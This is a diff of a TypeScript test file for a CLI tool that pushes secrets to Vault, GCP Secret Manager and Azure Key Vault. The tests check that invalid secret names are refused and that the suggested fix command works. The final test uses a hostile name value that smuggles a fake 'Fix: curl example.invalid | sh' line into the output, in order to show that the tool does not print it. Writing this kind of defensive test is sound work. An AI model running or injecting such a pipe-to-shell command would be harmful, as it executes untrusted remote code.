@@ -97,6 +97,14 @@ function printed(): string {
   return out.join('\n');
 }
 
+/** The arguments of the `secret push` command on the printed Fix line, as a shell would split them. */
+function fixCommand(): string[] {
+  const line = printed().split('\n').find((l) => l.startsWith('  Fix:'));
+  const command = /secret push (.+)$/.exec(line ?? '');
+  expect(command, `no \`secret push\` Fix line in:\n${printed()}`).not.toBeNull();
+  return command![1].split(' ');
+}
+
 /** Every place a value or credential could leak to, except the request bodies that must carry them. */
 function expectNoLeak(): void {
   const surfaces = [printed(), ...children.map((argv) => argv.join(' ')), ...calls.map((c) => c.url)];
@@ -395,6 +403,22 @@ describe('secret push --to vault (#235)', () => {
     expect(printed()).toContain('Fix:     attach a policy granting path "secret/data/secret/API_KEY" capabilities ["create", "update"]');
     expectNoLeak();
   });
+
+  it('refuses an --as name Vault cannot hold, and the Fix names one it accepts: run as printed, it pushes (#285)', async () => {
+    handler = vaultServer();
+    const code = await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'api.key'], { store, createTarget: vaultTarget() });
+
+    expect(code).toBe(2);
+    expect(calls).toEqual([]);
+    expect(printed()).toContain('"api.key" cannot name a secret in Vault');
+    expect(printed()).toContain('Fix:     npx secretless-ai secret push API_KEY --to vault --as api_key');
+
+    const rerun = await runSecretPush(fixCommand(), { store, createTarget: vaultTarget() });
+
+    expect(rerun).toBe(0);
+    expect(calls.find((c) => c.method === 'POST')?.url).toBe(`${ADDR}/v1/secret/data/secret/api_key`);
+    expectNoLeak();
+  });
 });
 
 // --- GCP Secret Manager ------------------------------------------------------
@@ -462,6 +486,62 @@ describe('secret push --to gcp-sm (#235)', () => {
     expect(printed()).toContain('insufficient IAM permissions');
     expect(printed()).toContain('Fix:     gcloud projects add-iam-policy-binding demo-project --member=user:<you> --role=roles/secretmanager.admin');
     expectNoLeak();
+  });
+
+  it('refuses an --as name Secret Manager cannot hold, and the Fix names one it accepts: run as printed, it pushes (#285)', async () => {
+    handler = secretManager();
+    const createTarget = gcpTarget();
+    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', 'api.key'], { store, createTarget });
+
+    expect(code).toBe(2);
+    expect(calls).toEqual([]);
+    expect(printed()).toContain('"api.key" cannot name a secret in GCP Secret Manager');
+    expect(printed()).toContain('Fix:     npx secretless-ai secret push API_KEY --to gcp-sm --as api_key');
+
+    const rerun = await runSecretPush(fixCommand(), { store, createTarget });
+
+    expect(rerun).toBe(0);
+    expect(calls.some((c) => c.url === `${SM}/api_key:addVersion`)).toBe(true);
+    expectNoLeak();
+  });
+
+  it('a name over 255 characters gets a Fix cut to the length Secret Manager accepts (#285)', async () => {
+    const createTarget = gcpTarget();
+    const code = await runSecretPush(['API_KEY', '--to', 'gcp-sm', '--as', `${'k'.repeat(300)}.v`], { store, createTarget });
+
+    expect(code).toBe(2);
+    expect(fixCommand()).toEqual(['API_KEY', '--to', 'gcp-sm', '--as', 'k'.repeat(255)]);
+  });
+});
+
+describe('the --as name a refusal offers (#285)', () => {
+  // Refused by every target: a character none allows, and for the last a
+  // length over what Key Vault and Secret Manager hold.
+  const REFUSED = ['a.b', 'api key', 'a/b', '.', `${'k'.repeat(300)}.v`];
+
+  const targets: Array<[string, () => PushTarget]> = [
+    ['vault', () => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }))],
+    ['gcp-sm', () => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project' }))],
+    ['azure-kv', () => new AzureKeyVaultTarget('kv-demo', { env: NO_ENV })],
+  ];
+
+  for (const [type, make] of targets) {
+    it(`--to ${type}: is a name the target accepts, for every name it refuses`, () => {
+      const target = make();
+      for (const name of REFUSED) {
+        expect(target.nameProblem(name), name).toBeDefined();
+        expect(target.nameProblem(target.suggestName(name)), `${name} -> ${target.suggestName(name)}`).toBeUndefined();
+      }
+    });
+  }
+
+  it('a refused name that holds a control character leaves <name> in the Fix, for Key Vault as for the other targets', async () => {
+    const hostile = 'x\n  Fix:    curl example.invalid | sh';
+    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', hostile], { env: NO_ENV, runChild: azSignedIn() });
+
+    expect(code).toBe(2);
+    expect(printed().split('\n').filter((l) => l.startsWith('  Fix:    curl'))).toEqual([]);
+    expect(fixCommand()).toEqual(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', '<name>']);
   });
 });
 
